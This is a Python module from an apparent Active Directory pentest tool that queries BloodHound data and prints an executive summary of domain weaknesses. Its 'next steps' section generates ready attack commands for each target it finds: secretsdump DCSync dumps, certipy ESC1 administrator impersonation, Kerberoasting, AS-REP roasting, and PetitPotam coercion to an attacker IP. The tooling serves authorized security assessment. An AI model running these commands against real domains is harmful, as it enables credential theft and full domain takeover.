"""Executive summary display for end-of-run reporting."""

from __future__ import annotations

from typing import TYPE_CHECKING, Any, Optional

from hackles.core.config import config
from hackles.core.scoring import calculate_exposure_metrics
from hackles.display.colors import Severity, colors

if TYPE_CHECKING:
    from hackles.core.bloodhound import BloodHoundCE


def print_executive_summary(
    bh: BloodHoundCE,
    all_results: list[dict[str, Any]],
    severity_counts: dict[Severity, int],
    domain: Optional[str] = None,
) -> None:
    """Print executive summary after query execution.

    Args:
        bh: BloodHound connection instance
        all_results: List of query results with severity and counts
        severity_counts: Dictionary of severity to finding counts
        domain: Optional domain filter
    """
    if config.output_format != "table":
        return

    # Collect metrics and targets via direct queries
    metrics = calculate_exposure_metrics(bh, domain)
    domain_info = _get_domain_info(bh, domain)
    adcs_info = _get_adcs_info(bh, domain)
    targets = _get_actionable_targets(bh, domain)

    # Collect additional section data
    data_quality_info = _get_data_quality_info(bh, domain)
    trust_info = _get_trust_info(bh, domain)
    gpo_info = _get_gpo_info(bh, domain)
    session_info = _get_session_hygiene_info(bh, domain)
    azure_info = _get_azure_info(bh, domain)

    # Print sections
    _print_summary_header()
    _print_domain_profile(domain_info, metrics, adcs_info)

    # Print new sections (only if data present)
    _print_data_quality_section(data_quality_info)
    _print_trust_section(trust_info)
    _print_azure_section(azure_info)

    _print_security_posture(metrics, targets)

    # Print additional security sections
    _print_gpo_section(gpo_info)
    _print_session_hygiene_section(session_info)

    _print_key_findings(severity_counts)
    _print_next_steps(metrics, targets, adcs_info, domain_info)


def _fix_malformed_hostname(hostname: str) -> str:
    """Fix malformed hostnames with duplicated prefix (e.g., DC01.DC01.OSCP.EXAM -> DC01.OSCP.EXAM).

    Args:
        hostname: The hostname to check and fix

    Returns:
        Corrected hostname if malformed, otherwise original hostname
    """
    if not hostname or "." not in hostname:
        return hostname

    parts = hostname.split(".")
    if len(parts) >= 2 and parts[0].upper() == parts[1].upper():
        # First two segments are identical (case-insensitive), remove the duplicate
        return ".".join([parts[0]] + parts[2:])

    return hostname


def _get_domain_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get basic domain information."""
    domain_filter = "WHERE toUpper(d.name) = toUpper($domain)" if domain else ""
    params = {"domain": domain} if domain else {}

    info: dict[str, Any] = {}

    # Domain name and functional level
    query = f"""
    MATCH (d:Domain)
    {domain_filter}
    RETURN d.name AS name, d.functionallevel AS level
    LIMIT 1
    """
    results = bh.run_query(query, params)
    if results:
        info["name"] = results[0].get("name", "Unknown")
        info["level"] = results[0].get("level", "Unknown")

    # Domain Controller hostname (first one found)
    query = f"""
    MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
    WHERE g.objectid ENDS WITH '-516'
    {"AND toUpper(c.domain) = toUpper($domain)" if domain else ""}
    RETURN c.name AS dc_name, count(DISTINCT c) AS dc_count
    LIMIT 1
    """
    results = bh.run_query(query, params)
    if results:
        info["dc_count"] = results[0].get("dc_count", 0)
        # Fix malformed hostnames (e.g., DC01.DC01.OSCP.EXAM -> DC01.OSCP.EXAM)
        raw_dc_name = results[0].get("dc_name", "")
        info["dc_name"] = _fix_malformed_hostname(raw_dc_name)

    # Group count
    query = f"""
    MATCH (g:Group)
    {"WHERE toUpper(g.domain) = toUpper($domain)" if domain else ""}
    RETURN count(g) AS group_count
    """
    results = bh.run_query(query, params)
    if results:
        info["group_count"] = results[0].get("group_count", 0)

    return info


def _get_adcs_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get ADCS infrastructure information."""
    params = {"domain": domain} if domain else {}

    info: dict[str, Any] = {}

    # Enterprise CA count and name
    query = """
    MATCH (ca:EnterpriseCA)
    RETURN ca.name AS ca_name, count(ca) AS ca_count
    LIMIT 1
    """
    results = bh.run_query(query, params)
    if results:
        info["ca_count"] = results[0].get("ca_count", 0)
        info["ca_name"] = results[0].get("ca_name", "")

    # Certificate template count
    query = """
    MATCH (t:CertTemplate)
    RETURN count(t) AS template_count
    """
    results = bh.run_query(query, params)
    if results:
        info["template_count"] = results[0].get("template_count", 0)

    return info


def _get_actionable_targets(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, list[str]]:
    """Query for specific actionable targets for next steps."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(n.domain) = toUpper($domain)" if domain else ""
    user_filter = "AND toUpper(u.domain) = toUpper($domain)" if domain else ""
    comp_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    targets: dict[str, list[str]] = {}

    # DCSync non-admin principals
    # Excludes admin groups by membership AND by RID, plus legitimate replication groups
    query = f"""
    MATCH (n)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
    WHERE NOT (n)-[:MemberOf*1..]->(:Group {{name: 'DOMAIN ADMINS@' + toUpper(d.name)}})
    AND NOT (n)-[:MemberOf*1..]->(:Group {{name: 'ENTERPRISE ADMINS@' + toUpper(d.name)}})
    AND NOT (n)-[:MemberOf*1..]->(:Group {{name: 'ADMINISTRATORS@' + toUpper(d.name)}})
    // Exclude Domain Controllers by group membership (computers that are DCs)
    AND NOT EXISTS {{
        MATCH (n)-[:MemberOf*1..]->(dcg:Group)
        WHERE dcg.objectid ENDS WITH '-516'
    }}
    // Exclude built-in admin groups by RID
    AND NOT n.objectid ENDS WITH '-512'  // Domain Admins
    AND NOT n.objectid ENDS WITH '-519'  // Enterprise Admins
    AND NOT n.objectid ENDS WITH '-544'  // Administrators
    // Exclude legitimate replication groups
    AND NOT n.name STARTS WITH 'ENTERPRISE DOMAIN CONTROLLERS@'
    AND NOT n.name STARTS WITH 'ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@'
    AND NOT n.name STARTS WITH 'DOMAIN CONTROLLERS@'
    AND NOT n.objectid ENDS WITH '-516'  // Domain Controllers group
    AND NOT n.objectid ENDS WITH '-521'  // RODC group
    AND NOT n.name STARTS WITH 'MSOL_'
    {domain_filter.replace('n.domain', 'd.name')}
    RETURN DISTINCT n.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["dcsync"] = [r["name"] for r in results if r.get("name")]

    # ESC1 vulnerable templates (most critical)
    query = """
    MATCH (t:CertTemplate)
    WHERE t.enrolleesuppliessubject = true
    AND t.authenticationenabled = true
    AND t.enabled = true
    RETURN t.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["esc_templates"] = [r["name"] for r in results if r.get("name")]

    # Kerberoastable users (prioritize admins and old passwords)
    query = f"""
    MATCH (u:User {{enabled: true, hasspn: true}})
    WHERE u.admincount = true OR EXISTS((u)-[:AdminTo]->(:Computer))
    {user_filter}
    RETURN u.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["kerberoastable"] = [r["name"] for r in results if r.get("name")]

    # AS-REP roastable users
    query = f"""
    MATCH (u:User {{enabled: true, dontreqpreauth: true}})
    {"WHERE toUpper(u.domain) = toUpper($domain)" if domain else ""}
    RETURN u.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["asrep"] = [r["name"] for r in results if r.get("name")]

    # Unconstrained delegation (non-DC)
    query = f"""
    MATCH (c:Computer {{unconstraineddelegation: true, enabled: true}})
    WHERE NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(g:Group)
        WHERE g.objectid ENDS WITH '-516'
    }}
    {comp_filter}
    RETURN c.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["unconstrained"] = [r["name"] for r in results if r.get("name")]

    # Computers without LAPS (excluding Domain Controllers)
    query = f"""
    MATCH (c:Computer {{enabled: true}})
    WHERE (c.haslaps = false OR c.haslaps IS NULL)
    AND NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(g:Group)
        WHERE g.objectid ENDS WITH '-516'
    }}
    {comp_filter}
    RETURN c.name AS name
    LIMIT 10
    """
    results = bh.run_query(query, params)
    targets["no_laps"] = [r["name"] for r in results if r.get("name")]

    return targets


def _get_trust_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get domain trust analysis information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "WHERE toUpper(d1.name) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # Get all trusts with their properties
    query = f"""
    MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
    {domain_filter}
    RETURN
        d1.name AS trusting_domain,
        d2.name AS trusted_domain,
        COALESCE(r.trusttype, 'Unknown') AS trust_type,
        COALESCE(r.sidfilteringenabled, true) AS sid_filtering,
        COALESCE(r.transitive, false) AS transitive
    """
    results = bh.run_query(query, params)

    if results:
        info["total_trusts"] = len(results)
        info["external_trusts"] = sum(1 for r in results if r.get("trust_type") == "External")
        info["forest_trusts"] = sum(1 for r in results if r.get("trust_type") == "Forest")
        info["no_sid_filtering"] = sum(1 for r in results if not r.get("sid_filtering"))
        info["transitive_trusts"] = sum(1 for r in results if r.get("transitive"))

        # Get vulnerable trust names for display
        info["vulnerable_trusts"] = [
            f"{r['trusting_domain']} <-> {r['trusted_domain']}"
            for r in results
            if not r.get("sid_filtering")
        ][:5]

    return info


def _get_gpo_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get GPO security information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(gpo.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # GPOs linked to DC OU
    query = f"""
    MATCH (gpo:GPO)-[:GpLink]->(ou)
    WHERE toUpper(ou.name) CONTAINS 'DOMAIN CONTROLLERS'
       OR toUpper(COALESCE(ou.distinguishedname, '')) CONTAINS 'OU=DOMAIN CONTROLLERS'
    {domain_filter}
    RETURN count(DISTINCT gpo) AS dc_ou_gpos
    """
    results = bh.run_query(query, params)
    if results:
        info["dc_ou_gpo_count"] = results[0].get("dc_ou_gpos", 0)

    # Non-admin GPO control count
    query = f"""
    MATCH (n)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns]->(gpo:GPO)
    WHERE (n.admincount IS NULL OR n.admincount = false)
    {domain_filter}
    RETURN count(DISTINCT gpo) AS controlled_gpos, count(DISTINCT n) AS controllers
    """
    results = bh.run_query(query, params)
    if results:
        info["non_admin_controlled_gpos"] = results[0].get("controlled_gpos", 0)
        info["non_admin_controllers"] = results[0].get("controllers", 0)

    # GPOs with suspicious names
    query = f"""
    MATCH (g:GPO)
    WHERE g.name =~ '(?i).*(password|credential|admin|deploy|laps|bitlocker).*'
    {"AND toUpper(g.domain) = toUpper($domain)" if domain else ""}
    RETURN count(g) AS suspicious_gpos
    """
    results = bh.run_query(query, params)
    if results:
        info["suspicious_name_gpos"] = results[0].get("suspicious_gpos", 0)

    return info


def _get_session_hygiene_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get session hygiene information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # Tier Zero sessions on non-T0 computers
    query = f"""
    MATCH (c:Computer)-[:HasSession]->(u)
    WHERE (u:Tag_Tier_Zero OR 'admin_tier_0' IN COALESCE(u.system_tags, []))
      AND NOT (c:Tag_Tier_Zero OR 'admin_tier_0' IN COALESCE(c.system_tags, []))
    {domain_filter}
    RETURN count(DISTINCT c) AS computers, count(*) AS sessions
    """
    results = bh.run_query(query, params)
    if results:
        info["t0_exposed_computers"] = results[0].get("computers", 0)
        info["t0_exposed_sessions"] = results[0].get("sessions", 0)

    # Domain Admin sessions on non-DCs
    query = f"""
    MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group)
    WHERE g.objectid ENDS WITH '-512'
    AND NOT EXISTS {{
        MATCH (c)-[:MemberOf*1..]->(dc_group:Group)
        WHERE dc_group.objectid ENDS WITH '-516'
    }}
    {domain_filter}
    RETURN count(DISTINCT c) AS computers, count(DISTINCT u) AS admins
    """
    results = bh.run_query(query, params)
    if results:
        info["da_exposed_computers"] = results[0].get("computers", 0)
        info["da_exposed_admins"] = results[0].get("admins", 0)

    # Total privileged session exposure
    info["total_exposure"] = info.get("t0_exposed_sessions", 0) + info.get(
        "da_exposed_computers", 0
    )

    return info


def _get_azure_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get Azure/Hybrid identity information."""
    params = {"domain": domain} if domain else {}
    domain_filter = "AND toUpper(c.domain) = toUpper($domain)" if domain else ""

    info: dict[str, Any] = {}

    # AAD Connect servers
    query = f"""
    MATCH (c:Computer)
    WHERE c.name =~ '(?i).*AAD.*CONNECT.*|.*AZURE.*AD.*|.*AADC.*'
       OR ANY(spn IN COALESCE(c.serviceprincipalnames, [])
              WHERE toUpper(spn) CONTAINS 'AZUREADSSOACC')
    {domain_filter}
    RETURN count(c) AS aad_connect_servers, collect(c.name)[0..3] AS server_names
    """
    results = bh.run_query(query, params)
    if results:
        info["aad_connect_count"] = results[0].get("aad_connect_servers", 0)
        info["aad_connect_names"] = results[0].get("server_names", [])

    # MSOL/AAD sync accounts
    user_filter = "AND toUpper(n.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (n)
    WHERE (n:User OR n:Computer)
    AND (n.name =~ '(?i).*MSOL_.*' OR n.name =~ '(?i).*AAD_.*' OR n.name =~ '(?i).*SYNC_.*')
    {user_filter}
    RETURN count(n) AS sync_accounts, collect(n.name)[0..3] AS account_names
    """
    results = bh.run_query(query, params)
    if results:
        info["sync_account_count"] = results[0].get("sync_accounts", 0)
        info["sync_account_names"] = results[0].get("account_names", [])

    # AAD accounts with DCSync
    query = f"""
    MATCH (n)-[r:GetChanges|GetChangesAll|DCSync]->(d:Domain)
    WHERE n.name =~ '(?i).*(MSOL_|AAD_|SYNC_|AZUREADSSOACC).*'
    {"AND toUpper(d.name) = toUpper($domain)" if domain else ""}
    RETURN count(DISTINCT n) AS dcsync_count
    """
    results = bh.run_query(query, params)
    if results:
        info["dcsync_sync_accounts"] = results[0].get("dcsync_count", 0)

    return info


def _get_data_quality_info(bh: BloodHoundCE, domain: Optional[str] = None) -> dict[str, Any]:
    """Get data quality and staleness information."""
    import time

    params = {"domain": domain} if domain else {}
    info: dict[str, Any] = {}

    # Session count
    query = """
    MATCH ()-[r:HasSession]->()
    RETURN count(r) AS session_count
    """
    results = bh.run_query(query, params)
    if results:
        info["session_count"] = results[0].get("session_count", 0)

    # Stale account percentage (reuse stale_days config)
    threshold = int(time.time()) - (config.stale_days * 24 * 60 * 60)

    domain_filter = "WHERE toUpper(u.domain) = toUpper($domain)" if domain else ""
    # Count ALL enabled users (denominator for percentage)
    query = f"""
    MATCH (u:User {{enabled: true}})
    {domain_filter}
    RETURN count(u) AS total_users
    """
    results = bh.run_query(query, params)
    total_enabled = results[0].get("total_users", 0) if results else 0

    # Count stale users (those with lastlogon > 0 and older than threshold)
    domain_filter_and = "AND toUpper(u.domain) = toUpper($domain)" if domain else ""
    query = f"""
    MATCH (u:User {{enabled: true}})
    WHERE u.lastlogon > 0 AND u.lastlogon < $cutoff {domain_filter_and}
    RETURN count(u) AS stale_users
    """
    params["cutoff"] = threshold
    results = bh.run_query(query, params)
    if results:
        stale = results[0].get("stale_users", 0)
        info["stale_user_count"] = stale
        info["stale_user_pct"] = round((stale / total_enabled * 100) if total_enabled > 0 else 0, 1)

    return info


def _print_summary_header() -> None:
    """Print the executive summary header."""
    print()
    print(f"{colors.BOLD}{colors.BLUE}[*] Executive Summary{colors.END}")
    print(f"    {'═' * 50}")


def _print_domain_profile(
    domain_info: dict[str, Any],
    metrics: dict[str, Any],
    adcs_info: dict[str, Any],
) -> None:
    """Print domain profile section."""
    print()
    print(f"    {colors.BOLD}DOMAIN PROFILE{colors.END}")
    print(f"    {'─' * 50}")

    # Domain name
    name = domain_info.get("name", "Unknown")
    print(f"    {'Domain:':<24} {name}")

    # Functional level
    level = domain_info.get("level", "Unknown")
    print(f"    {'Functional Level:':<24} {level}")

    # Domain Controllers
    dc_count = domain_info.get("dc_count", 0)
    print(f"    {'Domain Controllers:':<24} {dc_count}")

    # Users
    enabled = metrics.get("enabled_users", 0)
    total = metrics.get("total_users", 0)
    print(f"    {'Users:':<24} {enabled} enabled ({total} total)")

    # Computers
    computers = metrics.get("total_computers", 0)
    print(f"    {'Computers:':<24} {computers} enabled")

    # Groups
    groups = domain_info.get("group_count", 0)
    print(f"    {'Groups:':<24} {groups}")

    # ADCS if present
    ca_count = adcs_info.get("ca_count", 0)
    if ca_count > 0:
        template_count = adcs_info.get("template_count", 0)
        print(f"    {'ADCS:':<24} {ca_count} CA(s), {template_count} templates")


def _print_security_posture(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
) -> None:
    """Print security posture section with risk indicators."""
    print()
    print(f"    {colors.BOLD}SECURITY POSTURE{colors.END}")
    print(f"    {'─' * 50}")

    # LAPS coverage
    total_comp = metrics.get("total_computers", 0)
    no_laps = metrics.get("computers_without_laps", 0)
    laps_pct = metrics.get("pct_computers_without_laps", 0)
    with_laps = total_comp - no_laps
    if total_comp > 0:
        coverage_pct = 100 - laps_pct
        if coverage_pct < 50:
            indicator = f"{colors.WARNING}[!]{colors.END}"
        else:
            indicator = f"{colors.GREEN}[+]{colors.END}"
        print(
            f"    {indicator} {'LAPS Coverage:':<22} "
            f"{coverage_pct:.0f}% ({with_laps}/{total_comp} computers)"
        )

    # Kerberoastable admins
    kerb_admins = metrics.get("kerberoastable_admins", 0)
    if kerb_admins > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'Kerberoastable Admins:':<22} "
            f"{kerb_admins} account(s)"
        )
    else:
        print(f"    {colors.GREEN}[+]{colors.END} {'Kerberoastable Admins:':<22} None detected")

    # AS-REP roastable
    asrep = metrics.get("asrep_roastable", 0)
    if asrep > 0:
        print(
            f"    {colors.WARNING}[!]{colors.END} {'AS-REP Roastable:':<22} " f"{asrep} account(s)"
        )
    else:
        print(f"    {colors.GREEN}[+]{colors.END} {'AS-REP Roastable:':<22} None detected")

    # Unconstrained delegation
    unconst = metrics.get("unconstrained_delegation_non_dc", 0)
    if unconst > 0:
        print(
            f"    {colors.WARNING}[!]{colors.END} {'Unconstrained Deleg:':<22} "
            f"{unconst} non-DC system(s)"
        )
    else:
        print(
            f"    {colors.GREEN}[+]{colors.END} {'Unconstrained Deleg:':<22} "
            f"None (excluding DCs)"
        )

    # DCSync - from direct query
    dcsync_targets = targets.get("dcsync", [])
    if dcsync_targets:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'DCSync Non-Admin:':<22} "
            f"{len(dcsync_targets)} principal(s)"
        )
    else:
        print(f"    {colors.GREEN}[+]{colors.END} {'DCSync Non-Admin:':<22} None detected")

    # Domain Admin count
    da_count = metrics.get("domain_admin_count", 0)
    if da_count > 20:
        print(
            f"    {colors.WARNING}[!]{colors.END} {'Domain Admins:':<22} "
            f"{da_count} (consider reducing)"
        )
    else:
        print(f"    {colors.GREEN}[+]{colors.END} {'Domain Admins:':<22} {da_count}")


def _print_data_quality_section(info: dict[str, Any]) -> None:
    """Print data quality/staleness section."""
    # Skip if no data quality info available
    if not info:
        return

    print()
    print(f"    {colors.BOLD}DATA QUALITY{colors.END}")
    print(f"    {'─' * 50}")

    # Session data info
    session_count = info.get("session_count", 0)
    if session_count > 0:
        print(f"    {colors.BLUE}[*]{colors.END} {'Active Sessions:':<22} {session_count}")
    else:
        print(f"    {colors.WARNING}[!]{colors.END} {'Active Sessions:':<22} None (stale data?)")

    # Stale account percentage
    stale_pct = info.get("stale_user_pct", 0)
    stale_count = info.get("stale_user_count", 0)
    if stale_pct > 50:
        indicator = f"{colors.WARNING}[!]{colors.END}"
    else:
        indicator = f"{colors.GREEN}[+]{colors.END}"
    print(
        f"    {indicator} {'Stale Accounts:':<22} "
        f"{stale_pct:.0f}% ({stale_count} users >{config.stale_days}d)"
    )


def _print_trust_section(info: dict[str, Any]) -> None:
    """Print trust analysis section."""
    if not info or info.get("total_trusts", 0) == 0:
        return

    print()
    print(f"    {colors.BOLD}TRUST ANALYSIS{colors.END}")
    print(f"    {'─' * 50}")

    # Trust counts
    total = info.get("total_trusts", 0)
    external = info.get("external_trusts", 0)
    forest = info.get("forest_trusts", 0)
    print(
        f"    {colors.BLUE}[*]{colors.END} {'Domain Trusts:':<22} "
        f"{total} total ({external} external, {forest} forest)"
    )

    # SID filtering disabled (critical risk)
    no_sid = info.get("no_sid_filtering", 0)
    if no_sid > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'SID Filter Disabled:':<22} "
            f"{no_sid} trust(s) - ESCALATION RISK"
        )
        for trust in info.get("vulnerable_trusts", []):
            print(f"        {colors.CYAN}→{colors.END} {trust}")
    else:
        print(f"    {colors.GREEN}[+]{colors.END} {'SID Filtering:':<22} " f"Enabled on all trusts")

    # Transitive trusts
    transitive = info.get("transitive_trusts", 0)
    if transitive > 0:
        print(f"    {colors.BLUE}[*]{colors.END} {'Transitive Trusts:':<22} {transitive}")


def _print_gpo_section(info: dict[str, Any]) -> None:
    """Print GPO security section."""
    # Only show if there are GPO findings
    has_findings = (
        info.get("dc_ou_gpo_count", 0) > 0
        or info.get("non_admin_controlled_gpos", 0) > 0
        or info.get("suspicious_name_gpos", 0) > 0
    )
    if not has_findings:
        return

    print()
    print(f"    {colors.BOLD}GPO SECURITY{colors.END}")
    print(f"    {'─' * 50}")

    # GPOs on DC OU
    dc_gpos = info.get("dc_ou_gpo_count", 0)
    if dc_gpos > 0:
        print(
            f"    {colors.WARNING}[!]{colors.END} {'GPOs on DC OU:':<22} "
            f"{dc_gpos} (high-value targets)"
        )

    # Non-admin GPO control
    controlled = info.get("non_admin_controlled_gpos", 0)
    controllers = info.get("non_admin_controllers", 0)
    if controlled > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'Non-Admin GPO Control:':<22} "
            f"{controlled} GPO(s) by {controllers} principal(s)"
        )

    # Suspicious GPO names
    suspicious = info.get("suspicious_name_gpos", 0)
    if suspicious > 0:
        print(
            f"    {colors.BLUE}[*]{colors.END} {'Interesting GPO Names:':<22} "
            f"{suspicious} (may contain credentials)"
        )


def _print_session_hygiene_section(info: dict[str, Any]) -> None:
    """Print session hygiene section."""
    if info.get("total_exposure", 0) == 0:
        return

    print()
    print(f"    {colors.BOLD}SESSION HYGIENE{colors.END}")
    print(f"    {'─' * 50}")

    # Tier Zero exposure
    t0_computers = info.get("t0_exposed_computers", 0)
    t0_sessions = info.get("t0_exposed_sessions", 0)
    if t0_sessions > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'T0 on Non-T0 Hosts:':<22} "
            f"{t0_sessions} session(s) on {t0_computers} computer(s)"
        )

    # DA exposure
    da_computers = info.get("da_exposed_computers", 0)
    da_admins = info.get("da_exposed_admins", 0)
    if da_computers > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'DA on Workstations:':<22} "
            f"{da_admins} admin(s) on {da_computers} computer(s)"
        )

    # Summary
    total = info.get("total_exposure", 0)
    if total > 0:
        print(
            f"    {colors.WARNING}[!]{colors.END} {'Total Exposure:':<22} "
            f"{total} privileged session(s) at risk"
        )


def _print_azure_section(info: dict[str, Any]) -> None:
    """Print Azure/Hybrid identity section."""
    # Only show if Azure/Hybrid infrastructure detected
    has_azure = info.get("aad_connect_count", 0) > 0 or info.get("sync_account_count", 0) > 0
    if not has_azure:
        return

    print()
    print(f"    {colors.BOLD}AZURE/HYBRID IDENTITY{colors.END}")
    print(f"    {'─' * 50}")

    # AAD Connect servers
    aad_count = info.get("aad_connect_count", 0)
    if aad_count > 0:
        print(f"    {colors.WARNING}[!]{colors.END} {'AAD Connect Servers:':<22} {aad_count}")
        for server in info.get("aad_connect_names", []):
            print(f"        {colors.CYAN}→{colors.END} {server}")

    # Sync accounts
    sync_count = info.get("sync_account_count", 0)
    if sync_count > 0:
        print(
            f"    {colors.BLUE}[*]{colors.END} {'Sync Accounts:':<22} "
            f"{sync_count} (MSOL/AAD/SYNC)"
        )

    # DCSync capability
    dcsync = info.get("dcsync_sync_accounts", 0)
    if dcsync > 0:
        print(
            f"    {colors.FAIL}[!]{colors.END} {'DCSync Capable:':<22} "
            f"{dcsync} sync account(s) - HIGH VALUE TARGET"
        )


def _print_key_findings(severity_counts: dict[Severity, int]) -> None:
    """Print key findings summary by severity."""
    print()
    print(f"    {colors.BOLD}KEY FINDINGS{colors.END}")
    print(f"    {'─' * 50}")

    has_findings = False
    for sev in [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]:
        count = severity_counts.get(sev, 0)
        if count > 0:
            has_findings = True
            color = sev.color
            label = f"{sev.label}:"
            print(f"    {color}{label:<12}{colors.END} {count} queries with findings")

    if not has_findings:
        print(f"    {colors.GREEN}No significant findings detected{colors.END}")


def _print_next_steps(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
    adcs_info: dict[str, Any],
    domain_info: dict[str, Any],
) -> None:
    """Print recommended next steps based on findings."""
    steps = _collect_next_steps(metrics, targets, adcs_info, domain_info)

    if not steps:
        return

    print()
    print(f"{colors.BOLD}{colors.BLUE}[*] Recommended Next Steps{colors.END}")
    print(f"    {'═' * 50}")

    # Group by priority
    critical_steps = [s for s in steps if s["priority"] == "CRITICAL"]
    high_steps = [s for s in steps if s["priority"] == "HIGH"]
    medium_steps = [s for s in steps if s["priority"] == "MEDIUM"]

    for step in critical_steps:
        _print_step(step, Severity.CRITICAL)

    for step in high_steps:
        _print_step(step, Severity.HIGH)

    for step in medium_steps:
        _print_step(step, Severity.MEDIUM)


def _print_step(step: dict[str, Any], severity: Severity) -> None:
    """Print a single next step recommendation."""
    color = severity.color
    priority = step["priority"]
    title = step["title"]
    description = step["description"]
    command = step["command"]
    targets = step.get("targets", [])

    print()
    print(f"    {color}[{priority}]{colors.END} {title}")
    print(f"    {description}")

    # Print targets if available
    if targets:
        max_show = 5
        for target in targets[:max_show]:
            print(f"      {colors.CYAN}→{colors.END} {target}")
        if len(targets) > max_show:
            print(f"      {colors.GRAY}... and {len(targets) - max_show} more{colors.END}")

    print(f"    {colors.GREEN}${colors.END} {command}")


def _collect_next_steps(
    metrics: dict[str, Any],
    targets: dict[str, list[str]],
    adcs_info: dict[str, Any],
    domain_info: dict[str, Any],
) -> list[dict[str, Any]]:
    """Collect next steps based on detected findings."""
    steps = []

    # Get domain and DC info for command substitution
    domain_name = domain_info.get("name", "<DOMAIN>")
    dc_name = domain_info.get("dc_name", "<DC>")
    ca_name = adcs_info.get("ca_name", "<CA>")

    # Extract short domain name (WELCOME from WELCOME.LOCAL)
    short_domain = domain_name.split(".")[0] if "." in domain_name else domain_name

    # CRITICAL: DCSync non-admin
    dcsync_targets = targets.get("dcsync", [])
    if dcsync_targets:
        steps.append(
            {
                "priority": "CRITICAL",
                "title": "DCSync Privileges",
                "description": "Non-admin principal(s) can replicate domain credentials",
                "targets": dcsync_targets,
                "command": f"secretsdump.py '{short_domain}/<USER>:<PASS>'@{dc_name}",
            }
        )

    # CRITICAL: ESC1 vulnerable templates
    esc_templates = targets.get("esc_templates", [])
    if esc_templates:
        template_example = esc_templates[0]
        steps.append(
            {
                "priority": "CRITICAL",
                "title": "ADCS Vulnerable Templates (ESC1)",
                "description": "Certificate templates allow impersonation of any user",
                "targets": esc_templates,
                "command": (
                    f"certipy req -u '<USER>@{domain_name}' -p '<PASS>' "
                    f"-ca {ca_name} -template {template_example} "
                    f"-upn administrator@{domain_name}"
                ),
            }
        )

    # HIGH: Kerberoastable admins
    kerb_targets = targets.get("kerberoastable", [])
    if kerb_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "Kerberoastable Admin Accounts",
                "description": "Request and crack service tickets for admin accounts",
                "targets": kerb_targets,
                "command": (
                    f"GetUserSPNs.py -request -dc-ip {dc_name} " f"'{short_domain}/<USER>:<PASS>'"
                ),
            }
        )

    # HIGH: AS-REP roastable
    asrep_targets = targets.get("asrep", [])
    if asrep_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "AS-REP Roastable Users",
                "description": "Extract hashes without authentication for offline cracking",
                "targets": asrep_targets,
                "command": (
                    f"GetNPUsers.py -dc-ip {dc_name} '{short_domain}/' "
                    f"-usersfile users.txt -format hashcat"
                ),
            }
        )

    # HIGH: Unconstrained delegation
    unconst_targets = targets.get("unconstrained", [])
    if unconst_targets:
        steps.append(
            {
                "priority": "HIGH",
                "title": "Unconstrained Delegation",
                "description": "Coerce authentication or wait for TGT delegation",
                "targets": unconst_targets,
                "command": (f"PetitPotam.py -u '<USER>' -p '<PASS>' " f"<ATTACKER_IP> {dc_name}"),
            }
        )

    # MEDIUM: Low LAPS coverage
    laps_pct = metrics.get("pct_computers_without_laps", 0)
    no_laps_targets = targets.get("no_laps", [])
    if laps_pct > 50 and no_laps_targets:
        steps.append(
            {
                "priority": "MEDIUM",
                "title": f"Low LAPS Coverage ({len(no_laps_targets)} non-DC computers)",
                "description": "Local admin passwords likely shared across systems",
                "targets": no_laps_targets,
                "command": f"nxc smb {dc_name} -u '<USER>' -p '<PASS>' --local-auth",
            }
        )

    # MEDIUM: ADCS infrastructure found (only if no critical ESC)
    ca_count = adcs_info.get("ca_count", 0)
    if ca_count > 0 and not esc_templates:
        steps.append(
            {
                "priority": "MEDIUM",
                "title": f"ADCS Infrastructure ({ca_count} CA)",
                "description": "Enumerate certificate templates for vulnerabilities",
                "targets": [ca_name] if ca_name else [],
                "command": (
                    f"certipy find -u '<USER>@{domain_name}' -p '<PASS>' " f"-dc-ip {dc_name}"
                ),
            }
        )

    return steps
